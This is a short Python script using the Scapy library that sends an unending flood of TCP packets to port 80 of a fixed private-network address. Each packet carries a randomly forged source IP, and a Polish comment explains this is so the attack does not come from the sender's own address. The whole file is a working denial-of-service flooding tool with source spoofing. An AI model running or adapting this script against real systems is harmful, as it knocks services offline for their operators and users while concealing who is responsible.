from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP
import time

def generate_random_source_ip(): # generacje src ip żeby ze swojego nie atakować
    address=[69,69,69,69]
    dot='.'
    address[0]=str(random.randrange(11,197))
    address[1]=str(random.randrange(0,255))
    address[2]=str(random.randrange(0,255))
    address[3]=str(random.randrange(2,254))
    returned_address=address[0]+dot+address[1]+dot+address[2]+dot+address[3]
    return returned_address

targetip='192.168.1.165'

while True:
    source_IP=generate_random_source_ip()
    print('generated ip', source_IP)
    source_port = RandNum(1024, 65535)
    packet=IP(src=source_IP,dst=targetip)/TCP(sport=source_port,dport=80)
    send(packet)
  #  time.sleep(1)
